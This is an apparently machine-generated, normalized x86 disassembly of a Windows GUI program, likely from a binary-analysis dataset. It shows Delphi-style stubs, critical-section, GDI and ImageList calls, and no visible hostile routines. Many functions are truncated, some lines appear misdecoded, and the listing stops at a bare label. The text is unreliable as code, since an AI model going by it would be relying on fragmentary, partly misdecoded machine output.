pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403224
retn
sub_418337
jmp sub_403960
sub_41835b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036ac
sub_418392
jmp sub_4036ac
sub_4183d1
jmp sub_403960
sub_4183d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183fa
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f80
retn
sub_4183f3
jmp sub_403960
sub_4183fa
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418481
jmp sub_4036ac
sub_4184ae
jmp sub_403960
sub_4184b5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4184c0
push ecx
mov edx esp
mov ecx 0x4
call sub_416c84
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416744
sub_4185cd
jmp sub_403960
sub_4185d4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4186b3
jmp sub_403960
sub_4186ba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418710
jmp sub_403960
sub_418717
pop ebx
pop ecx
pop ebp
retn
sub_41895f
jmp sub_403960
sub_418966
pop ecx
pop ecx
pop ebp
retn
sub_4189a9
jmp sub_403960
sub_4189b0
pop ebx
pop ecx
pop ebp
retn
sub_418a4c
jmp sub_403960
sub_418a53
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418b01
jmp sub_403960
sub_418b08
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418b14
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_418d6f
jmp sub_403960
sub_418d76
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d9b
mov eax [ ebp - 0x8 ]
call sub_403224
mov eax [ ebp - 0x4 ]
call sub_403224
retn
sub_418d94
jmp sub_403960
sub_418d9b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dc0
lea eax [ ebp - 0x1c ]
call sub_405598
lea eax [ ebp - 0x18 ]
call sub_403f5c
retn
sub_418db9
jmp sub_403960
sub_418dc0
pop ebx
mov esp ebp
pop ebp
retn
sub_418fd2
jmp sub_403960
sub_418fd9
pop ebx
mov esp ebp
pop ebp
retn
sub_41902c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_4158f4
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419044
test dl dl
je r-xdata
mov dl 0x8
call sub_4191c8
retn
mov dl 0x9
call sub_4191c8
retn
sub_4190cc
mov dl 0x1
call sub_4191c8
retn
sub_4190d4
xor edx edx
call sub_4191c8
retn
sub_4191b9
jmp sub_403960
sub_4191c0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4191dc
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c774
sub_419210
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_419228
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419234
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_419228
sub_41935a
jmp sub_4036ac
sub_419389
jmp sub_403960
sub_4193bf
jmp sub_403960
sub_4193c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193e5
push rw-data
call LeaveCriticalSection
retn
sub_4193de
jmp sub_403960
sub_4193e5
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194b4
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419690
sub_419514
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4177d0
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419528
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4177d0
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41953c
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_419058
retn
sub_419548
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_419058
retn
sub_4197f0
xor eax eax
retn
sub_4197f4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4197fc
xor eax eax
retn
sub_419800
retn
sub_419804
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fb0
pop esi
pop ebx
retn
sub_419818
mov eax [ eax + 0x4 ]
retn
sub_41981c
retn
sub_419820
xor eax eax
retn
sub_419824
retn
sub_419828
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419834
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_419840
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41984c
retn
sub_419850
xchg edx eax
call sub_417474
retn
sub_419858
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_4198e0
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403420
pop esi
retn
sub_4198f4
retn
sub_4199d4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fb0
pop esi
pop ebx
retn
sub_419a14
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_419b60
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403454
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_419b78
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_419c00
retn
sub_419c48
retn
sub_419c80
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_419c98
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419ebc
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403420
pop esi
pop ebx
retn
sub_419ce0
mov al 0x1
retn
sub_419ce4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419cec
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_419d94
xor eax eax
retn
sub_419d98
retn
sub_419dc4
retn
sub_419e5c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_419e70
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_4137bc
retn
sub_419fb7
jmp sub_4036ac
sub_419fbc
mov ebx 0x1
call sub_403a14
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a01f
jmp sub_4036ac
sub_41a024
mov ebx 0x80030103
call sub_403a14
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a0a2
jmp sub_4036ac
sub_41a0a7
mov ebx 0x80030009
call sub_403a14
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a105
jmp sub_4036ac
sub_41a10a
mov ebx 0x8000ffff
call sub_403a14
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a2d5
jmp sub_403960
sub_41a2e6
jmp sub_4036ac
sub_41a2eb
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a314
lea eax [ ebp + 0xc ]
call sub_405598
retn
sub_41a30d
jmp sub_403960
sub_41a314
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a320
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a32c
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a338
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a344
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a3b3
jmp sub_4036ac
sub_41a3b8
mov esi 0x8000ffff
call sub_403a14
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a3cc
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41a439
jmp sub_403960
sub_41a440
mov eax [ rw-data ]
call sub_403224
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a450
call sub_413108
retn
sub_41a518
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41a6bc
jmp sub_403960
sub_41a6c3
pop ebp
retn
sub_41a751
jmp sub_403960
sub_41a758
pop ebp
retn
sub_41aa29
jmp sub_403960
sub_41aa30
pop ebp
retn
sub_41aa34
sub [ rw-data ] 0x1
retn
sub_41b6ec
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41b760
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41b7d4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41b7e0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41b8c0
jmp sub_403960
sub_41b8c7
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b957
jmp sub_403960
sub_41b9e9
jmp sub_403960
sub_41b9f0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ba54
jmp sub_403960
sub_41ba5b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bac3
jmp sub_403960
sub_41baca
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bb6d
jmp sub_403960
sub_41bb74
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c014
push 0x33
mov ecx rw-data
call sub_4133c8
retn
sub_41c024
push 0x33
mov ecx rw-data
call sub_413388
retn
sub_41c034
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c058
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41c22c
push 0x11
mov ecx rw-data
call sub_413388
retn
sub_41c36c
push ebx
mov ebx eax
mov eax ebx
call sub_41c034
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41c426
jmp sub_403960
sub_41c42d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c058
retn
sub_41c443
jmp sub_403960
sub_41c45c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c4b9
jmp sub_403960
sub_41c4c0
pop ebx
pop ecx
pop ebp
retn
sub_41c639
jmp sub_403960
sub_41c661
jmp sub_403960
sub_41c668
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c6d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4041c0
pop esi
pop ebx
retn
sub_41c748
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41c6a4
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41c784
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41c7bc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41c7ec
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41c90a
jmp sub_403960
sub_41c911
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c058
retn
sub_41c927
jmp sub_403960
sub_41c99d
jmp sub_403960
sub_41c9a4
pop ebx
pop ecx
pop ebp
retn
sub_41c9a8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41ca5e
jmp sub_403960
sub_41ca70
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403420
sub_41ca84
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41cab4
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41cbc3
jmp sub_403960
sub_41cbca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c058
retn
sub_41cbe0
jmp sub_403960
sub_41cc59
jmp sub_403960
sub_41cc60
pop ebx
pop ecx
pop ebp
retn
sub_41cd91
jmp sub_403960
sub_41cda4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d0e4
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41d418
jmp sub_403960
sub_41d41f
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41d428
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41d460
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d46c
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d5ac
retn
sub_41d675
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41d68c
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41d778
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d798
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d7b8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d7d8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
pop ebx
retn
sub_41d7f0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
pop ebx
retn
sub_41d814
mov eax [ rw-data ]
call sub_41d7f0
retn
sub_41d86a
jmp sub_403960
sub_41d871
pop ecx
pop ebp
retn
sub_41d910
jmp sub_403960
sub_41d917
pop ebx
mov esp ebp
pop ebp
retn
sub_41d9e9
jmp sub_403960
sub_41da7a
jmp sub_403960
sub_41da81
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41daac
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41db93
jmp sub_403960
sub_41dd40
jmp sub_403960
sub_41dd47
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41df59
jmp sub_403960
sub_41df60
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41dffa
jmp sub_403960
sub_41e1d6
jmp sub_403960
sub_41e290
jmp sub_403960
sub_41e297
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2b7
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e2b0
jmp sub_403960
sub_41e2b7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41e445
jmp sub_403960
sub_41e610
jmp sub_403960
sub_41e617
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e63a
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41e633
jmp sub_403960
sub_41e63a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e65a
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41e653
jmp sub_403960
sub_41e65a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41e7ac
push 0x0
call sub_41e748
retn
sub_41e851
jmp sub_403960
sub_41e858
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41e864
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41e7b4
pop ebx
pop ebp
retn 0x4
sub_41e878
retn
sub_41e87c
test eax eax
jne r-xdata
retn
call sub_41e878
sub_41ea4f
jmp sub_403960
sub_41ea76
jmp sub_403960
sub_41ea7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41eabc
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41ec89
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub_41ec92
jmp sub_403960
j_sub_41ec89
jmp sub_41ec89
sub_41ec99
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403224
retn
sub_41ecaf
jmp sub_403960
sub_41ecc0
xor eax eax
retn
sub_41ecc4
mov al [ eax + 0x21 ]
retn
sub_41ed10
jmp sub_403960
sub_41ed17
pop esi
pop ecx
pop ebp
retn
sub_41ed44
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41ed9b
jmp sub_403960
sub_41eda2
pop esi
pop ecx
pop ebp
retn
sub_41eda8
retn
sub_41edac
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41edbc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41eeda
jmp sub_403960
sub_41ef02
jmp sub_403960
sub_41ef09
mov esp ebp
pop ebp
retn
sub_41ef80
jmp sub_403960
sub_41f088
jmp sub_403960
sub_41f173
jmp sub_403960
sub_41f180
inc [ eax + 0x4 ]
retn
sub_41f2fb
jmp sub_403960
sub_41f6ac
jmp sub_403960
sub_41f8f6
jmp sub_403960
sub_41f920
jmp sub_403960
sub_41f927
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f949
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_41f942
jmp sub_403960
sub_41f953
jmp sub_4036ac
sub_41f9a2
jmp sub_403960
sub_41fbcf
jmp sub_403960
sub_41fc17
jmp sub_403960
sub_41fd84
jmp sub_403960
sub_41fe4b
jmp sub_4036ac
sub_41fea0
mov [ eax + 0x31 ] 0x0
call sub_41eabc
retn
sub_4200f1
jmp sub_403960
sub_42015c
jmp sub_403960
sub_420163
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4201d4
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_420288
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_420298
push ebx
mov ebx eax
mov eax ebx
call sub_420450
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_4202ac
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4202c8
push ebx
mov ebx eax
mov eax ebx
call sub_4204b0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_420324
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_420433
jmp sub_403960
sub_420697
jmp sub_4036ac
sub_4206f7
jmp sub_403960
sub_4206fe
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_420adf
jmp sub_403960
sub_420b0b
jmp sub_403960
sub_420b72
jmp sub_4036ac
sub_420ba3
jmp sub_403960
sub_420c28
jmp sub_4036ac
sub_420c2d
mov eax [ ebp - 0x38 ]
call sub_403224
call sub_4039c0
call sub_403a14
sub_420c3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c5c
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_420c55
jmp sub_403960
sub_420dab
jmp sub_4036ac
sub_421077
jmp sub_4036ac
sub_421108
mov cl 0x1
call sub_421110
retn
sub_4213c5
add [ eax ] al
add [ ebx ] dh
leave
call sub_421110
retn
sub_42144a
jmp sub_4036ac
sub_42144f
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4039c0
call sub_403a14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4214a0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4215d9
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_421608
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42161c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_421735
jmp sub_4036ac
sub_4217ea
jmp sub_4036ac
sub_421854
jmp sub_4036ac
sub_421888
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_421814
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_4218a0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d7d8
retn
mov [ eax + 0x30 ] edx
retn
sub_4218b8
retn
sub_4218bc
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d7d8
retn
mov [ eax + 0x2c ] edx
retn
sub_4218fc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d7d8
pop ebp
retn 0x4
sub_421910
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d7d8
pop ebp
retn 0x4
sub_421ad0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_421adc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_421b89
jmp sub_403960
sub_421b90
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421c7b
jmp sub_4036ac
sub_421ce7
jmp sub_403960
sub_421e15
jmp sub_403960
sub_421e1c
pop ebp
retn
sub_421f1c
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_421f51
jmp sub_403960
sub_421f58
pop ebp
retn
sub_421f5c
sub [ rw-data ] 0x1
retn
sub_4221a4
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_413918
retn
sub_4221d8
mov eax [ eax + 0x4 ]
call sub_4137bc
retn
sub_422209
jmp sub_403960
sub_422210
pop ebp
retn
sub_422214
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ __import_lookup_table_12(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_4222fd
jmp sub_403960
sub_422304
pop ebp
retn
sub_422308
sub [ rw-data ] 0x1
retn
sub_4223cf
jmp sub_403960
sub_4223d6
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4229ec
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4223f8
mov [ rw-data ] sub_422510
mov [ rw-data ] sub_422480
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_422714
mov [ rw-data ] sub_4227e8
mov [ rw-data ] sub_4228bc
retn
sub_422a7d
jmp sub_403960
sub_422a84
pop ebp
retn
sub_422a88
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4229ec
sub_422abd
jmp sub_403960
sub_422ac4
pop ebp
retn
sub_422ac8
sub [ rw-data ] 0x1
retn
sub_422d57
add eax 0xffffffd4
jmp sub_423884
sub_422d5f
add eax 0xffffffd4
jmp sub_4238e0
sub_422d71
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40566c
sub_422d7b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405680
sub_422f0a
jmp sub_403960
sub_422f11
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423121
jmp sub_403960
sub_423128
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4232dd
jmp sub_403960
sub_423342
jmp sub_403960
sub_423349
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423435
jmp sub_403960
sub_42343c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42364c
lea eax [ ebp - 0x30 ]
call sub_403f5c
lea eax [ ebp - 0x20 ]
call sub_403f5c
retn
sub_42365d
jmp sub_403960
j_sub_42364c
jmp sub_42364c
sub_423664
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42375f
jmp sub_403960
sub_423766
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423863
jmp sub_403960
sub_42386a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4238ca
lea eax [ ebp - 0x4 ]
call sub_405598
retn
sub_4238d3
